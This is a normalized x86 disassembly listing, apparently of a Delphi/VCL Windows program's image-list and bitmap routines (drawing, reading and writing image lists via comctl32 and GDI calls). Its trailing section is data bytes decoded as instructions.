mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44cbd0
push eax
mov eax ebx
call sub_44d1b8
call sub_44cbd0
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_42146c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44cebc
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_425d58
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_420c38
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41613c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_425d58
pop edx
call sub_421010
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_425d58
call sub_42146c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44cebc
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41613c
mov eax [ ebx + 0x54 ]
call sub_425d58
call sub_42146c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_420c38
mov eax edi
call sub_42146c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_420c38
mov eax edi
call sub_42146c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_426ac8
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44d3b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44d3d8
pop ebx
pop ebp
retn 0xc
sub_44d3d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd80
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44d424
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41613c
mov eax [ ebp - 0x4 ]
call sub_44e0b8
xor eax eax
push ebp
push sub_44d5bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d5a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d583
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_426ac8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d58a
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_425d58
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_421010
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42146c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_425d58
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_421010
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_42146c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cff8
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44d5cc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cebc
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44d424
sub_44d5ec
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
call sub_44cf20
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_417b14
mov eax ebx
call sub_44d174
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44d7d4
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44cebc
mov edx eax
mov eax ebx
call sub_44ce58
mov eax ebx
call sub_44cd80
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44cebc
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44cd88
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cebc
push eax
call ImageList_GetBkColor
call sub_44cbf0
mov edx eax
mov eax ebx
call sub_44d180
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44d5cc
jmp r-xdata
sub_44d6ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_417bf8
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44d7d4
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44d174
mov eax esi
call sub_44cebc
mov edx eax
mov eax ebx
call sub_44ce58
mov eax ebx
call sub_44cd80
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44cebc
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44cd88
jmp r-xdata
mov eax esi
call sub_44cebc
push eax
call ImageList_GetBkColor
call sub_44cbf0
mov edx eax
mov eax ebx
call sub_44d180
mov edx esi
mov eax ebx
call sub_44d5cc
pop esi
pop ebx
retn
sub_44d75c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d7c8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d7cf
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44d7fc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_417570
mov si 0xffff
call sub_4034e4
inc ebp
dec edi
jne r-xdata
sub_44d84c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417460
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417570
cmp ebp eax
jne r-xdata
sub_44d8a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407f60
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44d8e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44d0c4
mov ebx eax
mov eax edi
call sub_44d0c4
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44d0c4
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44d9c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d9a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44d8a4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9ae
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
mov eax edi
call sub_44d0c4
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44d9d8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44d0c4
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44d8e8
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44da34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41d410
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44d9d8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44da8c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_419514
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_419514
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44dd10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4192e8
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_419308
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44dcf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_426ac8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41613c
mov eax [ ebp - 0x4 ]
call sub_44e0b8
xor eax eax
push ebp
push sub_44dcd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcdd
mov eax [ ebp - 0xc ]
call sub_4032e8
mov eax [ ebp - 0x14 ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
call sub_44e0bc
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416164
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_425d58
push eax
mov eax [ ebp - 0xc ]
call sub_425d58
lea edx [ ebp - 0x30 ]
pop ecx
call sub_420ea8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416164
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_425d58
push eax
mov eax [ ebp - 0x14 ]
call sub_425d58
lea edx [ ebp - 0x30 ]
pop ecx
call sub_420ea8
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cff8
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44dd20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db90
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dd80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44ce90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd87
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub eax 0xffffffec
sub_44dd87
mov eax [ ebp - 0x4 ]
call sub_44cd80
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44deb6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_419308
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_419a10
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_419308
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_419308
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db90
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44de99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_419308
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44ce90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_419308
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44dee8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44cf20
mov eax edi
call sub_4192e8
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_419308
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44da8c
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44dd20
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44df74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e06e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c070
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44cebc
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44cebc
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e075
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
jmp r-xdata
sub_44e0dc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
mov edx esi
call sub_44d84c
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44e128
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e14d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e154
retn
sub_44e3ef
add [ ebx ] al
or eax 0x6e654d54
jne r-xdata
add [ eax ] al
add [ ebx + edi * 4 + 0x44 ] ch
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
jne r-xdata
add [ ecx + edi * 8 - 0x2753ffbc ] dh
inc ecx
add [ eax - 0x27 ] al
inc ecx
add [ ecx + ebx * 8 - 0x967ffbf ] dl
inc esp
add al dl
inc ecx
outsd
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x4d050044 ] ah
outsb
jne r-xdata
test [ eax + eax ] 0xf7
inc esp
add [ edi + esi * 8 - 0x8cfffbc ] dl
inc esp
add [ edx + eax * 8 - 0x89fffbc ] ah
inc esp
add al dl
test [ eax + eax + 0x4 ] 0x380044f8
clc
inc esp
add [ eax + edi * 8 - 0x74bffbc ] dl
inc esp
add ah dl
clc
inc esp
add ah dh
clc
inc esp
add [ eax ] bl
retn
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x270bffc0 ] bl
inc ecx
add [ esi + esi * 8 + 0x44 ] dl
add [ eax ] ch
fld [ ecx ]
insb
clc
inc esp
add [ ecx + ebx * 8 + 0x41 ] bl
mov eax eax
pushad
in al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
in al 0x44
add [ eax + eax ] bl
add [ eax ] al
insb
mov ebx 0x35300044
inc eax
add [ esi + 0x35400040 ] bh
sub_44e4c2
inc esp
add [ ebx + eax * 8 ] ah
inc esp
add [ eax ] dh
stc
inc esp
add [ ecx + edi * 8 + 0x44 ] dl
add [ ecx + edi * 8 + 0x44 ] dh
add [ ecx + edi * 8 - 0x98fffbc ] dl
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
inc esp
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
pop esp
cli
inc esp
add al ch
and al [ ebp ]
insb
add [ ebp ] al
adc al 0x7b
inc ecx
add [ esi + edi * 8 + 0x23600044 ] dh
inc ebp
add al bh
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ch 0x44
add ah dl
in eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x39ffbb1b ] bl
in eax 0x44
add [ eax + eax + 0x5e3c0000 ] ch
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x5a3ffc0 ] bl
add [ eax ] ch
fadd [ ecx ]
loopne r-xdata
inc esp
add [ eax ] dh
adc eax 0x2c00045
inc ebp
add al ah
push ss
inc ebp
add [ esi + ebx + 0x45 ] cl
add [ eax ] cl
sbb al 0x45
add [ eax + 0x1d ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax ] bl
add [ eax ] al
pop es
add bh ch
sub_44e5a4
clc
push edx
push ecx
inc [ eax + 0x1a840045 ]
inc ebp
add [ ebx + ebx + 0x45 ] dl
add [ ebx + ebx + 0x1ff40045 ] cl
inc ebp
add al ah
pop ds
inc ebp
add al ah
sbb [ ebp ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc ebx
push 0xa46b6365
jecxz r-xdata
arpl [ ebx - 0x5c ] bp
insd
aam 0xe5
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
